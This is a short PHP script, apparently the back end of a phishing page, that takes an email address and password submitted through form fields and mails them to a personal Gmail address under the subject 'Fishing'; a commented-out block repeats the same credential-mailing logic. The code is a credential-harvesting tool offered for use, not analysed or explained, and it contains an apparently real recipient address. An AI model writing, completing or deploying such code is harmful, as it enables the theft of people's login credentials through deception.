<?php 



$mail = $POST['val'];
$pass = $POST['val1'];
$to      = 'narekxachatryan1998@gmail.com';
$subject = "Fishing";
$message = "email: ".$mail.' | '."password: ".$pass;
$headers = 'From: webmaster@example.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);




// $to = 'narekxachatryan1998@gmail.com';
// $subject = 'Fishing';
// $message = 'Email: ' . $mail . ' | ' .'Password: '. $password;
// // Sending email
// if(mail($to, $subject, $message)){
//     // echo 'Your mail has been sent successfully.';
//     print $mail;
// } else{
//     echo 'Unable to send email. Please try again.';
// }



